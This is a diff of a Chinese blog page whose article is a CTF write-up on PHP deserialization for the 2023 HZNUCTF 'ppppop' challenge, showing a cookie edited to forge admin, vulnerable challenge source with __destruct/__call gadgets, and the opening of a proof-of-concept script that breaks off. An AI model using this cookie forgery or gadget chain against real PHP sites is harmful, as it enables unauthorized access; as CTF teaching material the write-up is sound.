@@ -1,388 +1,41 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>反序列化 - Potat0w0</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Potat0w0"><meta name="msapplication-TileImage" content="/img/icon.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Potat0w0"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="反序列化学习"><meta property="og:type" content="blog"><meta property="og:title" content="反序列化"><meta property="og:url" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><meta property="og:site_name" content="Potat0w0"><meta property="og:description" content="反序列化学习"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/default8.png"><meta property="article:published_time" content="2023-02-09T07:28:48.000Z"><meta property="article:modified_time" content="2024-01-10T09:49:48.733Z"><meta property="article:author" content="Potat0w0"><meta property="article:tag" content="Web"><meta property="article:tag" content="反序列化"><meta property="article:tag" content="Java"><meta property="article:tag" content="PHP"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://example.com/img/default8.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},"headline":"反序列化","image":["http://example.com/img/default8.png"],"datePublished":"2023-02-09T07:28:48.000Z","dateModified":"2024-01-10T09:49:48.733Z","author":{"@type":"Person","name":"Potat0w0"},"publisher":{"@type":"Organization","name":"Potat0w0","logo":{"@type":"ImageObject","url":"http://example.com/img/icon.jpg"}},"description":"反序列化学习"}</script><link rel="canonical" href="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><link rel="icon" href="/img/icon.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
 
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
 
-<!DOCTYPE html>
-<html lang="en" data-default-color-scheme=dark>
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
 
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/icon.jpg" alt="Potat0w0" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">时间轴</a><a class="navbar-item" href="/categories">归档</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><div class="card-image"><span class="image is-7by3"><img class="fill" src="/img/default8.png" alt="反序列化"></span></div><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-02-09T07:28:48.000Z" title="2023/2/9 15:28:48">2023-02-09</time>发表</span><span class="level-item"><time dateTime="2024-01-10T09:49:48.733Z" title="2024/1/10 17:49:48">2024-01-10</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">常见漏洞</a><span> / </span><a class="link-muted" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a></span><span class="level-item">1 小时读完 (大约8627个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">反序列化</h1><div class="content"><!-- more -->
 
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
-  <link rel="icon" href="/img/icon.jpg">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="Potat0w0">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="PHP反序列化2023 HZNUCTF ppppop打开页面发现什么也没有，查看Cookie发现存在Cookie 1Cookie&#x3D;Tzo0OiJVc2VyIjoxOntzOjc6ImlzQWRtaW4iO2I6MDt9  base64解码后得到一串序列化数据 1O:4:&quot;User&quot;:1:&amp;#123;s:7:&quot;isAdmin&quot;;b:0;&amp;#125;  b的值为">
-<meta property="og:type" content="article">
-<meta property="og:title" content="反序列化">
-<meta property="og:url" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
-<meta property="og:site_name" content="Potat0w0">
-<meta property="og:description" content="PHP反序列化2023 HZNUCTF ppppop打开页面发现什么也没有，查看Cookie发现存在Cookie 1Cookie&#x3D;Tzo0OiJVc2VyIjoxOntzOjc6ImlzQWRtaW4iO2I6MDt9  base64解码后得到一串序列化数据 1O:4:&quot;User&quot;:1:&amp;#123;s:7:&quot;isAdmin&quot;;b:0;&amp;#125;  b的值为">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230404125943007.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406153731384.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406170242128.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406171445334.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406172912264.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406173119381.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406173259433.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104152115919.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104152231540.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104170635067.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104172505250.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104173755984.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104173931280.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240104173915503.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231019013247721.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231019204338159.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021012846629.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021010227415.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021010725181.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021011511542.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021012716791.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021014204061.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231021014539958.png">
-<meta property="og:image" content="http://example.com/image-20231021014828001.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022155742899.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022160100214.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022160209274.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022203901385.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022172803715.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022173034403.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023182039564.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231022221215908.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023131127298.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023133557862.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023185409822.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023201319727.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023201830216.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023202220648.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023202252783.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023211918059.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023212204163.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231023213313186.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231024201831539.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231024204719080.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108114017966.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108114105893.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108114801340.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108145428517.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231108142522597.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109004511915.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109014536461.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109014742419.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231109014804849.png">
-<meta property="og:image" content="http://example.com/image-20231121212303111.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122111314683.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122111508088.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122113329914.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122112147020.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231122114338097.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124173103719.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124202726171.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124202758635.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124172054469.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124221325557.png">
-<meta property="og:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231124222409538.png">
-<meta property="article:published_time" content="2023-02-09T07:28:48.000Z">
-<meta property="article:modified_time" content="2024-01-04T17:44:20.459Z">
-<meta property="article:author" content="Potat0w0">
-<meta property="article:tag" content="Web">
-<meta property="article:tag" content="反序列化">
-<meta property="article:tag" content="PHP">
-<meta property="article:tag" content="Java">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230404125943007.png">
-  
-  
-    <meta name="referrer" content="no-referrer-when-downgrade">
-  
-  
-  <title>反序列化 - Potat0w0</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
-
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":50,"cursorChar":"💕","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-
-  
-<meta name="generator" content="Hexo 6.3.0"></head>
-
-
-<body>
-  
-
-  <header>
-    
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>Potat0w0&#39;s Blog</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                <span>Home</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>Archives</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                <span>Categories</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>Tags</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                <span>About</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                <span>Links</span>
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <i class="iconfont icon-search"></i>
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
-              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
-            </a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="反序列化"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-author" aria-hidden="true"></i>
-        Potat0w0
-      </span>
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-02-09 15:28" pubdate>
-          February 9, 2023 pm
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          34k words
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          284 mins
-        
-      </span>
-    
-
-    
-    
-      
-        <span id="busuanzi_container_page_pv" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="busuanzi_value_page_pv"></span> views
-        </span>
-        
-      
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">反序列化</h1>
-            
-              <p class="note note-info">
-                
-                  
-                    Last updated on 3 days ago
-                  
-                
-              </p>
-            
-            
-              <div class="markdown-body">
-                
-                <h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="2023-HZNUCTF-ppppop"><a href="#2023-HZNUCTF-ppppop" class="headerlink" title="2023 HZNUCTF ppppop"></a>2023 HZNUCTF ppppop</h2><p>打开页面发现什么也没有，查看Cookie发现存在Cookie</p>
-<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Cookie=Tz<span class="hljs-meta">o0</span>OiJ<span class="hljs-attr">Vc2</span>VyIjoxO<span class="hljs-symbol">ntzOjc6</span>ImlzQWRtaW<span class="hljs-number">4</span>i<span class="hljs-meta">O2</span>I<span class="hljs-number">6</span>MDt<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure>
+<h2 id="2023-HZNUCTF-ppppop"><a href="#2023-HZNUCTF-ppppop" class="headerlink" title="2023 HZNUCTF ppppop"></a>2023 HZNUCTF ppppop</h2><p>打开页面发现什么也没有，查看Cookie发现存在Cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Cookie=Tzo0OiJVc2VyIjoxOntzOjc6ImlzQWRtaW4iO2I6MDt9<br></code></pre></td></tr></table></figure>
 
 <p>base64解码后得到一串序列化数据</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;isAdmin&quot;</span>;b:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">O:4:&quot;User&quot;:1:&#123;s:7:&quot;isAdmin&quot;;b:0;&#125;<br></code></pre></td></tr></table></figure>
 
 <p>b的值为0，尝试将b改为1伪造admin用户登录，进入网页，显示网页源码高亮：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;utils.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$className</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcName</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;className;<br>        <span class="hljs-variable">$funcName</span> = <span class="hljs-variable language_">$this</span>-&gt;funcName;<br>        <span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-variable">$func</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkUser</span>()) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]));<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$payload</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
@@ -391,12 +44,12 @@
 <p>编写poc验证漏洞:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$className</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcName</span>;<br>    <span 